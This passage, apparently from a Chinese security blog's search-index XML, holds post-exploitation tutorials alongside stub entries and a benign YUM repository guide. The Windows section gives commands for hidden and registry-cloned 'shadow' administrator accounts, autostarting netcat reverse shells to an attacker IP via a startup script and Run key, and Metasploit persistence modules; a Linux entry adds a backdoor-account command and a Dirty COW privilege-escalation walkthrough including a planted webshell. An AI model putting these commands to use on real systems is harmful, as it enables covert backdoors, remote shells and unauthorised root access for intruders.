        <content type="html"><![CDATA[<h2 id="影子账号创建"><a href="#影子账号创建" class="headerlink" title="影子账号创建"></a>影子账号创建</h2><h3 id="创建普通账号"><a href="#创建普通账号" class="headerlink" title="创建普通账号"></a>创建普通账号</h3><blockquote><p>net user laosec 123admiN@ /add                  #创建普通账号laosec密码为123admiN@<br>net localgroup administrators laosec /add   #将普通账号laosec添加进administrators组</p></blockquote><h3 id="创建隐藏账号"><a href="#创建隐藏账号" class="headerlink" title="创建隐藏账号"></a>创建隐藏账号</h3><blockquote><p>net user laosec$ 123admiN@ /add                #创建隐藏账号laosec$密码为123admiN@(计算机管理可见)<br>net localgroup administrators laosec$ /add #将隐藏账号laosec$添加到administrators组中</p></blockquote><h3 id="创建影子账号"><a href="#创建影子账号" class="headerlink" title="创建影子账号"></a>创建影子账号</h3><h5 id="步骤一：打开注册表"><a href="#步骤一：打开注册表" class="headerlink" title="步骤一：打开注册表"></a>步骤一：打开注册表</h5><blockquote><p>WIN+R–&gt;regedit  #注册表编辑器命令<br>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/<br>#遇到没有权限问题对HKEY_LOCAL_MACHINE/SAM/SAM右键-&gt;权限赋予当前用户administrator的具有完全控制和读取权限</p></blockquote><h5 id="步骤二：修改隐藏账号"><a href="#步骤二：修改隐藏账号" class="headerlink" title="步骤二：修改隐藏账号"></a>步骤二：修改隐藏账号</h5><blockquote><p>在Users目录下有00000XXX开头的文件还有Names<br>找到Names文件夹下的administrator单击，可以看到右侧的类型，其类型的值便对应着上面00000XXX<br>选中与administrator所对应的00000XXX在右侧双击F键值，在弹出窗口中将值内容全部复制    </p><p>#此值要给予要创建的影子账号的F键值中<br>在Names中找到要修改账户的类型值，找到其对应的00000XXX，并将刚才复制的内容覆盖掉其影子账户的F中的值</p></blockquote><blockquote><p>导出Names下的影子账户为1.reg<br>导出Users下影子账户对应的00000XXX为2.reg</p></blockquote><h5 id="步骤三：删除隐藏账号"><a href="#步骤三：删除隐藏账号" class="headerlink" title="步骤三：删除隐藏账号"></a>步骤三：删除隐藏账号</h5><blockquote><p>net user laosec$ /del        #删除隐藏账号laosec$</p></blockquote><h5 id="步骤四：创建隐藏账号"><a href="#步骤四：创建隐藏账号" class="headerlink" title="步骤四：创建隐藏账号"></a>步骤四：创建隐藏账号</h5><blockquote><p>将1.reg导入到注册表中<br>将2.reg导入到注册表中</p></blockquote><h5 id="步骤五：注销登录验证"><a href="#步骤五：注销登录验证" class="headerlink" title="步骤五：注销登录验证"></a>步骤五：注销登录验证</h5><p><a href="https://imgchr.com/i/sR624K"><img src="https://s3.ax1x.com/2021/01/20/sR624K.png"></a></p><h2 id="NC自动反弹"><a href="#NC自动反弹" class="headerlink" title="NC自动反弹"></a>NC自动反弹</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><p>通过上传NC并配置注册表或开机自启动程序-&gt;重启服务器来获取到目标及其的CMD Shell</p><blockquote><ul><li>攻击者与受害者网络能够互通</li><li>攻击者VPS必须时刻监听相对应的端口</li></ul></blockquote></blockquote><h4 id="NC常规测试"><a href="#NC常规测试" class="headerlink" title="NC常规测试"></a>NC常规测试</h4><blockquote><p>nc -lvvp port              #攻击者VPS操作 侦听本地port<br>nc -t -e cmd.exe ip port   #受害者操作    正向连接到攻击者的VPS </p></blockquote><h4 id="1-自启动目录"><a href="#1-自启动目录" class="headerlink" title="1. 自启动目录"></a>1. 自启动目录</h4><blockquote><p>在受害者主机中进入到开机自启动目录下<br>C:\Documents and Settings\Administrator\「开始」菜单\程序\启动<br>创建sys.bat内容为<br>start /b nc -t -e cmd.exe 192.168.31.132 4444<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p></blockquote><h4 id="2-注册表启动"><a href="#2-注册表启动" class="headerlink" title="2. 注册表启动"></a>2. 注册表启动</h4><blockquote><p>reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run” /v “sysone” /t REG_SZ /d “C:sys.bat” /f</p></blockquote><blockquote><p>参数说明：<br>/v 所选项之下要添加的值名<br>   /t RegKey 数据类型 如果忽略，则采用 REG_SZ<br>   /d 要分配给添加的注册表 ValueName 的数据<br>   /f 不用提示就强行改写现有注册表项<br>在攻击者主机开启侦听<br>重启受害者主机，等待shell反弹</p></blockquote><h4 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h4><h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><h3 id="反向链接：Persistence模块"><a href="#反向链接：Persistence模块" class="headerlink" title="反向链接：Persistence模块"></a>反向链接：Persistence模块</h3><h4 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote><p>一个vbs后门写入了开机启动项但是容易被发现!</p></blockquote><blockquote><p>run persistence -U -i 10 -p 4444 -r 192.168.34.132</p></blockquote><blockquote><p>参数解释：</p><p>-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；<br>-i：  设置反向连接间隔时间，单位为秒；<br>-p：设置反向连接的端口号；<br>-r： 设置反向连接的ip地址；</p></blockquote><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote><p>use exploit/multi /handler</p><p>set PAYLOAD windows/meterpreter/reverse_tcp</p><p>set LHOST</p><p>set LPORT</p><p>exploit</p><p>meterpreter&gt;run persistence -U -i 10 -p 4444 -r 192.168.34.132</p></blockquote><h3 id="正向链接：Metsvc模块"><a href="#正向链接：Metsvc模块" class="headerlink" title="正向链接：Metsvc模块"></a>正向链接：Metsvc模块</h3><h4 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h4><blockquote><p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p><ul><li><p>metsvc.dll</p></li><li><p>metsvc-service.exe</p></li><li><p>metsvc.exe</p></li></ul></blockquote><h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><blockquote><p>use exploit/multi /handler</p><p>set PAYLOAD windows/metsvc_bind_tcp   </p><p>set RHOST     #设置要连接的远程主机</p><p>set LPORT      #设置本地端口即：31337</p><p>exploit</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之权限维持</title>
      <link href="2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>2021/01/19/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h2 id="常规权限维持"><a href="#常规权限维持" class="headerlink" title="常规权限维持"></a>常规权限维持</h2><h3 id="创建后门账号"><a href="#创建后门账号" class="headerlink" title="创建后门账号"></a>创建后门账号</h3><blockquote><p>useradd -p  `openssl passwd -1 -salt ‘salt’ 123456` guest</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RHCSA之软件包管理</title>
      <link href="2021/01/18/RHCSA-%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/"/>
      <url>2021/01/18/RHCSA-%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h2><h2 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h2><h2 id="包管理器安装"><a href="#包管理器安装" class="headerlink" title="包管理器安装"></a>包管理器安装</h2><h3 id="本地YUM源搭建"><a href="#本地YUM源搭建" class="headerlink" title="本地YUM源搭建"></a>本地YUM源搭建</h3><blockquote><ol><li><p>将光盘塞入光驱</p></li><li><p>mkdir /iso                  #创建进行文件挂载目录</p></li><li><p>mount /dev/sr0 /iso   #挂载镜像文件到/iso</p></li><li><p>cd /etc/yum.repos.d/ #进入到YUM配置目录</p></li><li><p>rm -rf *                      #删除所有的配置文件</p></li><li><p>vi repo.repo              #创建并编辑新的配置</p><blockquote><p>[Centos_iso]          #仓库描述</p><p>name = info           #对软件源的描述</p><p>baseurl=file:///iso   #镜像挂载位置</p><p>enable = 1             #是否启用此配置 0代表禁用 1代表启用</p><p>gpgchek = 0          #是否检测软件包签名</p></blockquote></li><li><p>yum clear all           #清除之前的YUM源信息</p></li><li><p>yum repolist            #列出YUM的信息</p></li><li><p>yum -y install gcc    #安装GCC编译程序</p></li><li><p>vi /etc/rc.d/rc.local</p><blockquote><p>mount /dev/sr0 /iso         #在最后一行添加</p></blockquote></li><li><p>chmod 755 /etc/rc.d/rc.local   #系统开机时自动挂载此脚本</p></li><li><p>reboot     #重启操作系统并验证</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 服务器运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之内核提权</title>
      <link href="2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"/>
      <url>2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="一：CVE-2016-5195-脏牛"><a href="#一：CVE-2016-5195-脏牛" class="headerlink" title="一：CVE-2016-5195(脏牛)"></a>一：CVE-2016-5195(脏牛)</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>Linux内核在处理内存写时拷贝（Copy-on-Write）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。<a href="https://www.exploit-db.com/exploits/40847"> 利用源码</a></p></blockquote><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><blockquote><p>低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取 root权限！</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote><p>Linux 内核：2.6.22 &lt; 3.9 (x86/x64)</p></blockquote><h3 id="实验1-Centos-6"><a href="#实验1-Centos-6" class="headerlink" title="实验1-Centos 6~"></a>实验1-Centos 6~</h3><h3 id="步骤一：搭建实验环境"><a href="#步骤一：搭建实验环境" class="headerlink" title="步骤一：搭建实验环境"></a>步骤一：搭建实验环境</h3><blockquote><p>[root@localhost ~]#yum -y install httpd php      //安装http与php</p><p>[root@localhost ~]#cd /etc/init.d                //进入</p><p>[root@localhost ~]#./httpd start                 //启动http服务</p><p>[root@localhost ~]#service iptables stop         //关闭Iptables</p><p>[root@localhost ~]#echo ‘一句话木马’ &gt; /var/www/html/ma.php</p></blockquote><h4 id="步骤二：信息收集"><a href="#步骤二：信息收集" class="headerlink" title="步骤二：信息收集"></a>步骤二：信息收集</h4><blockquote><p>[/var/www/html/]$ id<br>uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0            //普通用户权限</p><p>[/var/www/html/]$ uname -r<br>2.6.32-220.el6.x86_64                              //符合提权条件，即：&gt;=2.6.22</p></blockquote><h4 id="步骤三：上传并编译-C文件"><a href="#步骤三：上传并编译-C文件" class="headerlink" title="步骤三：上传并编译.C文件"></a>步骤三：上传并编译.C文件</h4><blockquote><p> [/tmp/]$ gcc -pthread dirty.c -o dirty -lcrypt    </p><p> //使用gcc对dirty.c进行编译 -o生成可执行文件为dirty -l参数制定编译的时候使用crypt库</p></blockquote><blockquote><p>注意：上传文件位置一定具有可读可写可执行也就是777</p></blockquote><h4 id="步骤四：运行提权程序"><a href="#步骤四：运行提权程序" class="headerlink" title="步骤四：运行提权程序"></a>步骤四：运行提权程序</h4><blockquote><p>[/tmp/]$ ./dirty 123456  //默认会创建firefart用户，而密码则是为其程序后面的参数123456</p></blockquote><h4 id="步骤五：切换用户身份"><a href="#步骤五：切换用户身份" class="headerlink" title="步骤五：切换用户身份"></a>步骤五：切换用户身份</h4><blockquote><p>[/tmp/]$ su firefart  //切换至提权默认创建的firefart用户  </p><p>[/tmp/]$ id           //查看当前用户信息</p></blockquote><h4 id="步骤六：权限恢复"><a href="#步骤六：权限恢复" class="headerlink" title="步骤六：权限恢复"></a>步骤六：权限恢复</h4><blockquote><p>mv /tmp/passwd.bak /etc/passwd </p></blockquote><h5 id="练习实验环境：bee-boxV1-6"><a href="#练习实验环境：bee-boxV1-6" class="headerlink" title="练习实验环境：bee-boxV1.6"></a>练习实验环境：bee-boxV1.6</h5><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li>更新升级最新 Linux Kernel 源码，并重新编译。</li></ul><h2 id="二：CVE-2016-8655"><a href="#二：CVE-2016-8655" class="headerlink" title="二：CVE-2016-8655"></a>二：CVE-2016-8655</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>此漏洞可用于未授权进程中执行内核代码，恶意访问者只需要本地普通权限，就可以利用该漏洞提升到管理员权限。<a href="https://www.exploit-db.com/exploits/40871">利用源码</a></p></blockquote><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><pre><code class="c">Linux Kernel 4.4.0 (Ubuntu 12.04 14.04 16.04 Debian 7 8)Ubuntu 16.04: 4.4.0-51-generic     //可生效版本Ubuntu 16.04: 4.4.0-47-genericUbuntu 16.04: 4.4.0-36-genericUbuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu</code></pre><h3 id="实验1-Ubuntu-16-04-内核版本4-4-0"><a href="#实验1-Ubuntu-16-04-内核版本4-4-0" class="headerlink" title="实验1:Ubuntu 16.04(内核版本4.4.0)~"></a>实验1:Ubuntu 16.04(内核版本4.4.0)~</h3><h4 id="步骤一：实验环境准备"><a href="#步骤一：实验环境准备" class="headerlink" title="步骤一：实验环境准备"></a>步骤一：实验环境准备</h4><pre><code class="php"></code></pre><h4 id="步骤二：信息收集-1"><a href="#步骤二：信息收集-1" class="headerlink" title="步骤二：信息收集"></a>步骤二：信息收集</h4><h2 id="三：CVE-2017-1000112"><a href="#三：CVE-2017-1000112" class="headerlink" title="三：CVE-2017-1000112"></a>三：CVE-2017-1000112</h2><h2 id="四：CVE-2017-7308"><a href="#四：CVE-2017-7308" class="headerlink" title="四：CVE-2017-7308"></a>四：CVE-2017-7308</h2><h2 id="五：CVE-2018-18955"><a href="#五：CVE-2018-18955" class="headerlink" title="五：CVE-2018-18955"></a>五：CVE-2018-18955</h2><h2 id="六：CVE-2018-5333"><a href="#六：CVE-2018-5333" class="headerlink" title="六：CVE-2018-5333"></a>六：CVE-2018-5333</h2><h2 id="七：CVE-2019-13272"><a href="#七：CVE-2019-13272" class="headerlink" title="七：CVE-2019-13272"></a>七：CVE-2019-13272</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h3 id="实验1-Debian"><a href="#实验1-Debian" class="headerlink" title="实验1-Debian"></a>实验1-Debian</h3><h3 id="实验2-…"><a href="#实验2-…" class="headerlink" title="实验2-…"></a>实验2-…</h3><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h2 id="相关连接"><a href="#相关连接" class="headerlink" title="相关连接"></a>相关连接</h2><ul><li><a href="https://github.com/FireFart/dirtycow">FireFart未编译</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">多发行版未编译</a></li><li><a href="https://github.com/Brucetg/DirtyCow-EXP">已编译Linux与Android</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之信息收集</title>
      <link href="2021/01/18/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/01/18/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之信息收集</title>
      <link href="2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="2021/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>2021/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>#网络工程师</p><blockquote><p>第一课</p></blockquote><blockquote><p>第二课</p></blockquote><blockquote><p>….</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
